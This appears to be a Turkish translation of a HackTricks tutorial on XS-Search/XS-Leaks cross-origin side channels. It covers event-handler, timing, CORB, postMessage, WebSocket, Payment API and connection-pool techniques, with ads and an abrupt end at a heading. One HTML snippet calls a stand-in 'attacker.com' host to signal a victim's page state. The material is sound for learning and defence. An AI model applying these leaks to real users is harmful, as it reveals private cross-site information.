# XS-Arama/XS-Sızıntılar

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Edinin:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Sıfırdan Kahraman'a AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı göndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR'lar gönderin.

</details>

## Temel Bilgiler

XS-Arama, **yan kanal zafiyetlerinden yararlanarak** **çapraz kökenli bilgileri çıkarmak** için kullanılan bir yöntemdir.

Bu saldırıda yer alan ana bileşenler şunlardır:

* **Zararlı Web**: Bilgilerin çıkarılması amaçlanan hedef web sitesi.
* **Saldırganın Web'i**: Saldırgan tarafından oluşturulan zararlı web sitesi, kurbanın ziyaret ettiği ve saldırıyı barındıran site.
* **Dahil Etme Yöntemi**: Zararlı Web'i Saldırganın Web'ine dahil etmek için kullanılan teknik (örneğin, window.open, iframe, fetch, href ile HTML etiketi vb.).
* **Sızıntı Tekniği**: Dahil etme yöntemi aracılığıyla elde edilen bilgilere dayanarak Zararlı Web'in durumu arasındaki farkları ayırt etmek için kullanılan teknikler.
* **Durumlar**: Saldırganın ayırt etmeyi amaçladığı Zararlı Web'in iki potansiyel durumu.
* **Algılanabilir Farklar**: Saldırganın Zararlı Web'in durumunu çıkarmak için güvendiği gözlemlenebilir farklar.

### Algılanabilir Farklar

Zararlı Web'in durumlarını ayırt etmek için birkaç yön incelenebilir:

* **Durum Kodu**: **Çeşitli HTTP yanıt durum kodları** arasındaki farkları ayırt etmek, sunucu hataları, istemci hataları veya kimlik doğrulama hataları gibi çapraz kökenli olarak.
* **API Kullanımı**: Sayfalar arasında **Web API'larının kullanımını** tanımlamak, çapraz kökenli bir sayfanın belirli bir JavaScript Web API'sını kullanıp kullanmadığını ortaya çıkarır.
* **Yönlendirmeler**: Yalnızca HTTP yönlendirmeler değil, aynı zamanda JavaScript veya HTML tarafından tetiklenen farklı sayfalara yapılan gezinmelerin algılanması.
* **Sayfa İçeriği**: HTTP yanıt gövdesindeki **değişikliklerin** veya sayfa alt kaynaklarında, örneğin **yerleştirilmiş çerçevelerin sayısı** veya görüntülerdeki boyut farklılıklarının gözlemlenmesi.
* **HTTP Başlığı**: Belirli bir **HTTP yanıt başlığının** varlığını veya değerini belirlemek, X-Frame-Options, Content-Disposition ve Cross-Origin-Resource-Policy gibi başlıkların varlığını veya değerini belirlemek.
* **Zamanlama**: İki durum arasındaki tutarlı zaman farklarının fark edilmesi.

### Dahil Etme Yöntemleri

* **HTML Elemanları**: HTML, stil sayfaları, görüntüler veya betikler gibi **çapraz kökenli kaynakları dahil etmek** için çeşitli elemanlar sunar, tarayıcının bir HTML olmayan kaynağı istemesini zorlar. Bu amaçla potansiyel HTML elemanlarının derlemesi [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks) adresinde bulunabilir.
* **Çerçeveler**: **iframe**, **object** ve **embed** gibi elemanlar, HTML kaynaklarını doğrudan saldırganın sayfasına gömebilir. Sayfanın **çerçeve koruması olmadığında**, JavaScript, çerçevelenmiş kaynağın window nesnesine contentWindow özelliği aracılığıyla erişebilir.
* **Açılır Pencereler**: **`window.open`** yöntemi, bir kaynağı yeni bir sekmede veya pencerede açar, JavaScript'e SOP'yi takip ederek yöntemlere ve özelliklere etkileşim sağlar. Sıkça tek oturum açma işlemlerinde kullanılan açılır pencereler, hedef kaynağın çerçeveleme ve çerez kısıtlamalarını atlar. Ancak modern tarayıcılar açılır pencerelerin oluşturulmasını belirli kullanıcı eylemlerine sınırlar.
* **JavaScript İstekleri**: JavaScript, **XMLHttpRequests** veya **Fetch API** kullanarak hedef kaynaklara doğrudan istekler yapılmasına izin verir. Bu yöntemler, HTTP yönlendirmelerini takip etmeyi seçmek gibi isteğe kesin kontrol sağlar.

### Sızıntı Teknikleri

* **Olay İşleyici**: XS-Sızıntılarda klasik bir sızıntı tekniği olan olay işleyicileri, **onload** ve **onerror** gibi olay işleyicileri, kaynak yükleme başarısı veya başarısızlığı hakkında bilgiler sağlar.
* **Hata Mesajları**: JavaScript istisnaları veya özel hata sayfaları, hata mesajından doğrudan sızıntı bilgileri sağlayabilir veya varlığının ve yokluğunun farklılaştırılması yoluyla sızıntı bilgileri sağlayabilir.
* **Global Sınırlar**: Tarayıcının fiziksel sınırları, bellek kapasitesi veya diğer zorunlu tarayıcı sınırları gibi, bir eşiğe ulaşıldığında sızıntı tekniği olarak işlev görebilir.
* **Global Durum**: Tarayıcıların **global durumlarıyla** (örneğin, Geçmiş arabirimi) algılanabilir etkileşimler, sözgelimi tarayıcının geçmişindeki **giriş sayısı**, çapraz kökenli sayfalar hakkında ipuçları sağlayabilir.
* **Performans API'si**: Bu API, mevcut sayfanın **performans detaylarını** sağlar, belge ve yüklenen kaynaklar için ağ zamanlamasını içerir, istenen kaynaklar hakkında çıkarımlar yapmayı sağlar.
* **Okunabilir Öznitelikler**: Bazı HTML öznitelikleri **çapraz kökten okunabilir** ve sızıntı tekniği olarak kullanılabilir. Örneğin, `window.frame.length` özelliği, JavaScript'in çapraz kökenli bir web sayfasında yer alan çerçeveleri saymasına olanak tanır.

## XSinator Aracı ve Makale

XSinator, **makalesinde açıklanan çeşitli bilinen XS-Sızıntılarına karşı tarayıcıları kontrol etmek için otomatik bir araçtır**: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Araça [**https://xsinator.com/**](https://xsinator.com/) adresinden **erişebilirsiniz**.

{% hint style="warning" %}
**Dışlanmış XS-Sızıntılar**: Diğer XS-Sızıntılarıyla çakışacağından **hizmet işçilerine dayanan XS-Sızıntıları** hariç bırakmak zorunda kaldık. Ayrıca, belirli bir web uygulamasındaki yanlış yapılandırmalar ve hatalara dayanan XS-Sızıntılarını hariç bırakmayı tercih ettik. Örneğin, Cross-Origin Resource Sharing (CORS) yanlış yapılandırmaları, postMessage sızıntıları veya Cross-Site Scripting. Ayrıca, genellikle yavaş, gürültülü ve doğru olmama sorunları yaşayan zaman tabanlı XS-Sızıntıları da hariç bıraktık.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Edinin:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
## **Zaman Tabanlı Teknikler**

Aşağıdaki tekniklerin bazıları, web sayfalarının olası durumlarındaki farklılıkları tespit etmek için süreyi kullanacak. Bir web tarayıcısında zamanı ölçmenin farklı yolları vardır.

**Saatler**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API, geliştiricilere yüksek çözünürlüklü zaman ölçümleri almasını sağlar.\
Saldırganların kullanabileceği birçok API vardır: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animasyonları ve diğerleri.\
Daha fazla bilgi için: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Olay İşleyici Teknikleri

### Onload/Onerror

* **Dahil Etme Yöntemleri**: Çerçeveler, HTML Elemanları
* **Algılanabilir Fark**: Durum Kodu
* **Daha fazla bilgi**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Özet**: Bir kaynağı yüklemeye çalışırken onerror/onload olayları tetiklenirse ve kaynak başarılı/başarısız bir şekilde yüklendiyse durum kodunu belirlemek mümkündür.
* **Kod örneği**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Kod örneği, **JS'den script nesneleri yüklemeyi dener**, ancak **nesneler, stil sayfaları, resimler, sesler** gibi diğer etiketler de kullanılabilir. Ayrıca, etiketi **doğrudan enjekte etmek** ve etiket içinde `onload` ve `onerror` olaylarını bildirmek de mümkündür (JS'den enjekte etmek yerine).

Bu saldırının ayrıca bir script olmayan versiyonu da bulunmaktadır:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Bu durumda, `example.com/404` bulunamadığında `attacker.com/?error` yüklenecektir.

### Onload Zamanlama

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Algılanabilir Fark**: Zamanlama (Genellikle Sayfa İçeriği, Durum Kodundan Kaynaklanır)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Özet:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** bir isteği gerçekleştirmenin ne kadar zaman aldığını ölçmek için kullanılabilir. Bununla birlikte, [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) gibi diğer saatler de kullanılabilir, bu saatler 50 ms'den fazla süren görevleri tanımlayabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) başka bir örnek:

{% content-ref url="performance.now-example.md" %}
[performance.now-example.md](performance.now-example.md)
{% endcontent-ref %}

#### Onload Zamanlama + Zorunlu Ağır Görev

Bu teknik, öncekine benzerdir, ancak **saldırgan** ayrıca **cevap olumlu veya olumsuz olduğunda** bazı eylemleri **ilgili bir süre alacak şekilde zorlar** ve bu süreyi ölçer.

{% content-ref url="performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Zamanlama

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Zamanlama (Genellikle Sayfa İçeriği, Durum Kodundan Kaynaklanır)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Özet:** [SharedArrayBuffer saat](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) bir isteği gerçekleştirmenin ne kadar zaman aldığını ölçmek için kullanılabilir. Diğer saatler de kullanılabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Bir kaynağı almanın ne kadar zaman aldığı, [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) ve [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) etkinliklerini kullanarak ölçülebilir. **`beforeunload`** etkinliği tarayıcının yeni bir sayfaya geçmeye hazırlandığında tetiklenirken, **`unload`** etkinliği navigasyon gerçekleştiğinde meydana gelir. Bu iki etkinlik arasındaki zaman farkı, tarayıcının kaynağı alırken harcadığı süreyi belirlemek için hesaplanabilir.

### Kumlanmış Çerçeve Zamanlama + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Zamanlama (Genellikle Sayfa İçeriği, Durum Kodundan Kaynaklanır)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Özet:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API bir isteği gerçekleştirmenin ne kadar zaman aldığını ölçmek için kullanılabilir. Diğer saatler de kullanılabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

[Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/) olmadığında, bir sayfa ve alt kaynaklarının ağ üzerinden yüklenmesi için gereken süre bir saldırgan tarafından ölçülebilir. Bu ölçüm genellikle, bir iframe'in `onload` işleyicisinin, kaynak yükleme ve JavaScript yürütmesinin tamamlanmasından sonra tetiklendiği için mümkündür. Betik yürütme tarafından tanıtılan değişkenliği atlatmak için bir saldırgan, `<iframe>` içinde [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) özniteliğini kullanabilir. Bu özniteliğin eklenmesi, JavaScript'in yürütülmesini kısıtlayarak, özellikle ağ performansı tarafından büyük ölçüde etkilenen bir ölçümü kolaylaştırır.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + hata + onload

* **Dahil Etme Yöntemleri**: Frames
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha fazla bilgi**:
* **Özet**: Sayfa doğru içeriğe erişildiğinde hata alabilir ve herhangi bir içeriğe erişildiğinde doğru şekilde yüklenebilirseniz, zamanı ölçmeden tüm bilgileri çıkarmak için bir döngü oluşturabilirsiniz.
* **Kod Örneği**:

Örneğin, **gizli** içeriğe sahip **sayfayı** bir **Iframe** içine **yerleştirebileceğinizi** varsayalım.

Kurbanın "_**bayrak**_" içeren dosyayı aramasını sağlayabilirsiniz, bir **Iframe** içinde (örneğin CSRF'yi sömürerek). Iframe içinde _**onload olayı**_ her zaman en az bir kez **gerçekleştirileceğini** biliyorsunuz. Sonra, Iframe'in **URL'sini** değiştirerek sadece URL'nin içindeki **hash** içeriğini değiştirerek **değiştirebilirsiniz**.

Örneğin:

1. **URL1**: www.saldırgan.com/xssearch#deneme1
2. **URL2**: www.saldırgan.com/xssearch#deneme2

Eğer ilk URL **başarılı bir şekilde yüklendiyse**, o zaman **URL'nin hash** kısmını **değiştirdiğinizde**, **onload** olayı **tekrar tetiklenmeyecek**. Ancak **eğer** sayfa bir tür **hata** içeriyorsa **yüklenirken**, o zaman **onload** olayı **tekrar tetiklenecektir**.

Bu sayede, **doğru** yüklenen bir sayfa ile erişilen bir sayfa arasında **ayırım yapabilirsiniz**.

### Javascript Yürütme

* **Dahil Etme Yöntemleri**: Frames
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha fazla bilgi**:
* **Özet:** Eğer **sayfa** **duyarlı** içeriği **döndürüyorsa** veya kullanıcı tarafından **kontrol edilebilecek** bir **içerik**. Kullanıcı **geçerli JS kodunu negatif durumda** ayarlayabilir, her denemeyi **`<script>`** etiketleri içinde **yükle**, böylece **negatif** durumlarda saldırganların **kodu** **yürütülür**, ve **olumlu** durumlarda **hiçbir şey** yürütülmez.
* **Kod Örneği:**

{% content-ref url="javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Algılanabilir Fark**: Durum Kodu ve Başlıklar
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Özet**: **Cross-Origin Read Blocking (CORB)**, **Spectre** gibi saldırılara karşı korunmak için web sayfalarının belirli hassas çapraz kökenli kaynakları yüklemesini önleyen bir güvenlik önlemidir. Ancak, saldırganlar koruyucu davranışını sömürebilir. **CORB**'a tabi bir yanıt, `nosniff` ile korunan bir `Content-Type` ile birlikte bir `2xx` durum kodu döndürdüğünde, **CORB** yanıtın gövdesini ve başlıklarını sıyırır. Bu durumu gözlemleyen saldırganlar, **başarı veya hata gösteren** durum kodu ve **CORB** tarafından korunduğunu belirten `Content-Type`'ın kombinasyonunu çıkarabilir, potansiyel bilgi sızıntısına yol açabilir.
* **Kod Örneği**:

Saldırı hakkında daha fazla bilgi için daha fazla bilgi bağlantısını kontrol edin.

### onblur

* **Dahil Etme Yöntemleri**: Frames
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Özet**: ID veya name özniteliğinden hassas veri sızdırma.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Bir sayfayı bir **iframe** içine yüklemek ve sayfanın **iframe'in elementine odaklanmasını** sağlamak için **`#id_değeri`** kullanabilirsiniz, ardından bir **`onblur`** sinyali tetiklendiğinde, ID öğesi varsa.\
Aynı saldırıyı **`portal`** etiketleri ile gerçekleştirebilirsiniz.

### postMessage Yayınları <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Dahil Etme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: API Kullanımı
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Özet**: Bir postMessage'dan hassas bilgileri toplamak veya postMessage'ın varlığını kullanarak kullanıcının sayfadaki durumunu bilmek için bir oracle olarak kullanmak.
* **Kod Örneği**: `Tüm postMessage'ları dinleyen herhangi bir kod.`

Uygulamalar genellikle farklı kökenler arasında iletişim kurmak için [`postMessage` yayınları](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) kullanır. Ancak, `targetOrigin` parametresi doğru şekilde belirtilmezse, bu yöntem **duyarlı bilgileri** yanlışlıkla açığa çıkarabilir, mesajları almak için herhangi bir pencereye izin verir. Ayrıca, bir mesaj almanın sadece bir **oracle** olarak işlev görebilir; örneğin, belirli mesajlar yalnızca oturum açmış kullanıcılara gönderilebilir. Bu nedenle, bu mesajların varlığı veya yokluğu, kullanıcının durumu veya kimliği hakkında bilgi verebilir, örneğin oturum açmış olup olmadığı gibi.

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Dünyanın en gelişmiş topluluk araçları tarafından desteklenen **otomatik iş akışları** oluşturmak ve **otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Global Sınırlar Teknikleri

### WebSocket API

* **Dahil Etme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: API Kullanımı
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Özet**: WebSocket bağlantı limitini tüketmek, çapraz kökenli bir sayfanın WebSocket bağlantılarının sayısını sızdırır.
* **Kod Örneği**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Hedef sayfanın kaç tane **WebSocket bağlantısı kullandığını** belirlemek mümkündür. Bu, bir saldırganın uygulama durumlarını tespit etmesine ve WebSocket bağlantı sayısına bağlı bilgiler sızdırmasına olanak tanır.

Bir **köken**, bağlantıların durumlarına bakılmaksızın, **maksimum miktarda WebSocket** bağlantı nesnesini kullandığında, yeni nesnelerin oluşturulması **JavaScript istisnalarına neden olur**. Bu saldırıyı gerçekleştirmek için, saldırgan web sitesi hedef web sitesini bir açılır pencerede veya iframe içinde açar ve hedef web yüklendikten sonra, mümkün olan en fazla WebSocket bağlantısını oluşturmaya çalışır. **Atılan istisnaların sayısı**, hedef web sitesi penceresi tarafından kullanılan **WebSocket bağlantılarının sayısıdır**.
### Ödeme API

* **Dahil Etme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: API Kullanımı
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Özet**: Yalnızca bir ödeme isteğinin aynı anda etkin olabileceğini belirleyin.
* **Kod Örneği**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Bu XS-Leak, bir saldırganın **çapraz kökenli bir sayfanın bir ödeme isteği başlattığını algılamasını** sağlar.

Çünkü **yalnızca bir ödeme isteğinin aynı anda etkin olabileceği** için, hedef web sitesi Ödeme İsteği API'sını kullanıyorsa, bu API'yi kullanmaya yönelik **diğer girişimler başarısız olacak** ve bir **JavaScript istisnasına** neden olacaktır. Saldırgan, bu durumu söz konusu olduğunda **düzenli aralıklarla Ödeme API arayüzünü göstermeye çalışarak** sömürebilir. Bir deneme istisna oluşturursa, hedef web sitesi şu anda bunu kullanıyor demektir. Saldırgan, bu düzenli denemeleri hemen arayüzü oluşturduktan sonra kapatılarak gizleyebilir.

### Olay Döngüsünün Zamanlaması <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Dahil Etme Yöntemleri**:
* **Algılanabilir Fark**: Zamanlama (Genellikle Sayfa İçeriği, Durum Kodu Nedeniyle)
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Özet:** Tek iplikli JS olay döngüsünü kötüye kullanarak bir web sayfasının yürütme süresini ölçün.
* **Kod Örneği**:

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript, [tek iplikli bir olay döngüsü](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) eşzamanlılık modelinde çalışır, bu da **aynı anda yalnızca bir görevi yürütebileceği anlamına gelir**. Bu özellik, **farklı kökenden gelen kodun ne kadar sürede yürütüldüğünü ölçmek** için sömürülebilir. Bir saldırgan, kendi kodlarının olay döngüsündeki yürütme süresini sürekli olarak sabit özelliklere sahip olaylar göndererek ölçebilir. Bu olaylar, olay havuzu boş olduğunda işlenir. Diğer kökenlerin de aynı havuza olaylar gönderdiği durumda, bir **saldırgan, kendi görevlerinin yürütülmesindeki gecikmeleri gözlemleyerek bu harici olayların yürütülme süresini çıkarabilir**. Bu gecikmeleri izlemek yöntemi, olay döngüsünü gecikmeler için izleyerek farklı kökenlerden gelen kodların yürütme süresini ortaya çıkarabilir ve hassas bilgileri ortaya çıkarabilir.

{% hint style="warning" %}
Bir yürütme zamanlamasında **daha kesin ölçümler** elde etmek için **ağ faktörlerini ortadan kaldırmak** mümkündür. Örneğin, sayfanın yüklenmeden önce kullandığı kaynakları yükleyerek.
{% endhint %}

### Meşgul Olay Döngüsü <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Dahil Etme Yöntemleri**:
* **Algılanabilir Fark**: Zamanlama (Genellikle Sayfa İçeriği, Durum Kodu Nedeniyle)
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Özet:** Bir web işleminin yürütme süresini ölçmenin bir yolu, bir ipliğin olay döngüsünü kasıtlı olarak engellemek ve ardından olay döngüsünün tekrar erişilebilir hale gelmesinin ne kadar sürdüğünü zamanlamaktır. Bir uzun hesaplama veya senkron API çağrısı gibi bir engelleme işlemi (örneğin) olay döngüsüne ekleyerek ve ardından sonraki kodun yürütmeye başlamasının ne kadar sürdüğünü izleyerek, olay döngüsü sırasında engelleme süresince yürütülen görevlerin süresini çıkarabilir. Bu teknik, JavaScript'in olay döngüsünün tek iplikli doğasından yararlanır, burada görevler sıralı olarak yürütülür ve aynı ipliği paylaşan diğer işlemlerin performansı veya davranışı hakkında bilgi sağlayabilir.

* **Kod Örneği**:

Olay döngüsünü kilitleyerek yürütme süresini ölçme tekniğinin önemli bir avantajı, **Site İzolasyonu**'nu atlatma potansiyeline sahip olmasıdır. **Site İzolasyonu**, farklı web sitelerini ayrı işlemlere ayıran ve kötü niyetli sitelerin diğer sitelerden hassas verilere doğrudan erişmesini engellemeyi amaçlayan bir güvenlik özelliğidir. Ancak, başka bir kökenin yürütme zamanlamasını paylaşılan olay döngüsü aracılığıyla etkileyerek, bir saldırgan, o kökenin etkinlikleri hakkında bilgi çıkarabilir. Bu yöntem, diğer kökenin verilerine doğrudan erişime dayanmaz, ancak o kökenin etkinliklerinin paylaşılan olay döngüsündeki etkisini gözlemler ve dolayısıyla **Site İzolasyonu** tarafından oluşturulan koruyucu bariyerlerden kaçınır.

{% hint style="warning" %}
Bir yürütme zamanlamasında **daha kesin ölçümler** elde etmek için **ağ faktörlerini ortadan kaldırmak** mümkündür. Örneğin, sayfanın yüklenmeden önce kullandığı kaynakları yükleyerek.
{% endhint %}

### Bağlantı Havuzu

* **Dahil Etme Yöntemleri**: JavaScript İstekleri
* **Algılanabilir Fark**: Zamanlama (Genellikle Sayfa İçeriği, Durum Kodu Nedeniyle)
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Özet:** Bir saldırgan, tüm soketleri kilitli tutabilir, hedef web sayfasını yükleyebilir ve aynı anda başka bir sayfayı yüklerken, son sayfanın yüklenmeye başlaması arasındaki süre hedef sayfanın yüklenme süresidir.
* **Kod Örneği**:

{% content-ref url="connection-pool-example.md" %}
[connection-pool-example.md](connection-pool-example.md)
{% endcontent-ref %}

Tarayıcılar sunucu iletişimi için soketleri kullanır, ancak işletim sistemi ve donanımın sınırlı kaynakları nedeniyle, **tarayıcılar eşzamanlı soketlerin sayısına bir sınırlama** getirmek zorundadır. Saldırganlar bu sınırlamayı aşağıdaki adımlarla sömürebilir:

1. Tarayıcının soket sınırını belirleyin, örneğin, 256 global soket.
2. Bağlantıları tamamlamadan açık tutacak şekilde farklı ana bilgisayarlara 255 istek başlatarak 255 soketi uzun bir süre işgal edin.
3. 256. soketi hedef sayfaya bir istek göndermek için kullanın.
4. Farklı bir ana bilgisayara 257. isteği göndermeye çalışın. Tüm soketlerin kullanımda olduğu (2. ve 3. adımlara göre) göz önüne alındığında, bu istek bir soket kullanılabilir hale gelene kadar sıraya alınacaktır. Bu isteğin devam etmeden önce beklemesi, saldırgana 256. soketle ilişkili ağ etkinliği hakkında zamanlama bilgisi sağlar (hedef sayfanın soketi). 2. adımdan gelen 255 soket hala meşgul olduğundan, herhangi yeni kullanılabilir soketin 3. adımdan serbest bırakılan soket olması gerektiğini ima eder. Dolayısıyla, 256. soketin kullanılabilir hale gelmesi için gereken süre, hedef sayfaya yapılan isteğin tamamlanması için gereken süre ile doğrudan ilişkilidir.

Daha fazla bilgi için: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Hedefe Göre Bağlantı Havuzu

* **Dahil Etme Yöntemleri**: JavaScript İstekleri
* **Algılanabilir Fark**: Zamanlama (Genellikle Sayfa İçeriği, Durum Kodu Nedeniyle)
* **Daha Fazla Bilgi**:
* **Özet:** Önceki teknik gibi, ancak tüm soketleri kullanmak yerine, Google **Chrome** aynı kökene **6 eşzamanlı istek sınırı** koyar. Eğer **5'ini bloke eder** ve ardından **6. bir istek başlatırsak**, bunu **zamanlayabiliriz** ve **kurban sayfanın** aynı uca **daha fazla istek göndermesini sağlamak** için **sayfa durumunu algılamak** için **6. istek** daha **uzun sürecektir** ve bunu algılayabiliriz.
## Performans API Teknikleri

